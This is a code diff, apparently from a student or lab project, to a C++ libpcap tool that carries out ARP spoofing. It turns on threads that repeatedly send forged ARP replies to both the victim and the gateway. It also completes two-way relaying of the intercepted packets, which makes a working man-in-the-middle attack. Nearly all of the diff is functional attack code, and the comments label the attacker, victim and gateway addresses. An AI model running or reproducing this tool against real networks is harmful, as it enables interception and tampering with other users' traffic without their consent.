@@ -87,65 +87,16 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	// test: send just one arp-spoof packet
-	EthArpPacket packet;
-	for (int i=0; i < ip_senders.size(); i++) {
-		packet.eth_.dmac_ = Mac(mac_senders[i]);		// victim's MAC
-		packet.eth_.smac_ = Mac(my_mac);				// attacker's MAC
-		packet.eth_.type_ = htons(EthHdr::Arp);
-		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-		packet.arp_.pro_ = htons(EthHdr::Ip4);
-		packet.arp_.hln_ = Mac::SIZE;
-		packet.arp_.pln_ = Ip::SIZE;
-		packet.arp_.op_ = htons(ArpHdr::Reply);
-
-		packet.arp_.smac_ = Mac(my_mac); 				// attacker's MAC 
-		packet.arp_.sip_ = htonl(Ip(ip_targets[i])); 	// gateway IP
-		packet.arp_.tmac_ = Mac(mac_senders[i]); 		// victim's MAC
-		packet.arp_.tip_ = htonl(Ip(ip_senders[i])); 	// victim's IP
-		int res = pcap_sendpacket((pcap_t*)handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-		if (res != 0) {
-			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr((pcap_t*)handle));
-			pcap_close(handle);
-			return -1;
-		}
-	}
-
 	pcap_close(handle);
 
-	// run ARP functions
+	// 4. run ARP functions
 	pthread_t tid1, tid2, tid3;
-	//pthread_create(&tid1, NULL, arp_spoofing_reply, (void *)dev);
-	//pthread_create(&tid2, NULL, arp_spoofing_recover, (void *)dev);
+	pthread_create(&tid1, NULL, arp_spoofing_reply, (void *)dev);
+	pthread_create(&tid2, NULL, arp_spoofing_recover, (void *)dev);
 	pthread_create(&tid3, NULL, arp_spoofing_relay, (void *)dev);
-	//pthread_join(tid1, (void **)&res);
-	//pthread_join(tid2, (void **)&res);
+	pthread_join(tid1, (void **)&res);
+	pthread_join(tid2, (void **)&res);
 	pthread_join(tid3, (void **)&res);
-
-	/*
-	// 4. DOOO ARP SPOOOOOOOFING 
-	packet.eth_.dmac_ = Mac(victim_MAC);			// victim's MAC
-	packet.eth_.smac_ = Mac(attacker_MAC);			// attacker's MAC
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Reply);
-	packet.arp_.smac_ = Mac(attacker_MAC); 			// attacker's MAC 
-	packet.arp_.sip_ = htonl(Ip(gateway_IP)); 		// gateway IP
-    packet.arp_.tmac_ = Mac(victim_MAC); 			// victim's MAC
-	packet.arp_.tip_ = htonl(Ip(victim_IP)); 		// victim's IP
-    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-		return -1;
-    }
-	*/
-	// 1. relay -- what?
-	// 2. recover -- unicast arp reply
-	// 3. periodic arp infect -- while sleep
 }
 
 int get_mac_addresses(pcap_t* handle, std::vector<char *> *pv_ip, std::vector<char *> *pv_mac)
@@ -208,7 +159,6 @@ int get_mac_addresses(pcap_t* handle, std::vector<char *> *pv_ip, std::vector<ch
 	return 1;
 }
 
-// TODO :: use different pcap * handle in arp_spoofing_reply and arp_spoofing_relay
 void *arp_spoofing_reply(void* dev) {
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live((const char *)dev, BUFSIZ, 1, 1, errbuf);
@@ -238,7 +188,27 @@ void *arp_spoofing_reply(void* dev) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr((pcap_t*)handle));
 			}
 		}
-		sleep(10);
+
+		for (int i=0; i < ip_targets.size(); i++) {
+			packet.eth_.dmac_ = Mac(mac_targets[i]);		// victim's MAC
+			packet.eth_.smac_ = Mac(my_mac);				// attacker's MAC
+			packet.eth_.type_ = htons(EthHdr::Arp);
+			packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+			packet.arp_.pro_ = htons(EthHdr::Ip4);
+			packet.arp_.hln_ = Mac::SIZE;
+			packet.arp_.pln_ = Ip::SIZE;
+			packet.arp_.op_ = htons(ArpHdr::Reply);
+
+			packet.arp_.smac_ = Mac(my_mac); 				// attacker's MAC 
+			packet.arp_.sip_ = htonl(Ip(ip_senders[i])); 	// victim IP
+			packet.arp_.tmac_ = Mac(mac_targets[i]); 		// target's MAC
+			packet.arp_.tip_ = htonl(Ip(ip_targets[i])); 	// target's IP
+			int res = pcap_sendpacket((pcap_t*)handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+			if (res != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr((pcap_t*)handle));
+			}
+		}
+		sleep(5);
 	}
 	
 }
@@ -326,22 +296,9 @@ void *arp_spoofing_relay(void* dev) {
 
 			for (int i=0; i<ip_senders.size(); ++i) {
 				if ((uint32_t)Ip(ip_senders[i]) == ntohl((uint32_t)ethip_hdr->ip_.ip_src)) {
-					// printf("[*] sender ->target (gateway)\n");
-
 					// sender -> target (gateway)
 					ethip_hdr->eth_.dmac_ = Mac(mac_targets[i]);
 					ethip_hdr->eth_.smac_ = Mac(my_mac);
-					/*
-					printf("[arp_spoofing_relay] dmac: %x", ((uint8_t*)ethip_hdr->eth_.dmac_)[0]);
-					for(int i=1; i<6; ++i)
-						printf(":%x", ((uint8_t*)ethip_hdr->eth_.dmac_)[i]);
-					printf("\n");
-					printf("[arp_spoofing_relay] smac: %x", ((uint8_t*)ethip_hdr->eth_.smac_)[0]);
-					for(int i=1; i<6; ++i)
-						printf(":%x", ((uint8_t*)ethip_hdr->eth_.smac_)[i]);
-					printf("\n");
-					*/
-
 					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ethip_hdr), header->len);
 					if (res != 0) {
 						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -350,15 +307,20 @@ void *arp_spoofing_relay(void* dev) {
 					}
 				}
 
-				// THIS PACKET DOES NOT CAPTURED...
 				else if((uint32_t)Ip(ip_senders[i]) == ntohl((uint32_t)ethip_hdr->ip_.ip_dst)) {
 					// target (gateway) -> sender
-					printf("[*] target (gateway) -> sender\n");
-
-
+					ethip_hdr->eth_.dmac_ = Mac(mac_senders[i]);
+					ethip_hdr->eth_.smac_ = Mac(my_mac);
+					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ethip_hdr), header->len);
+					if (res != 0) {
+						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+						pcap_close(handle);
+						return (void *)NULL;
+					}
 				}
 			}
 		}
 	}
 	pcap_close(handle);
+	return (void *)NULL;
 }
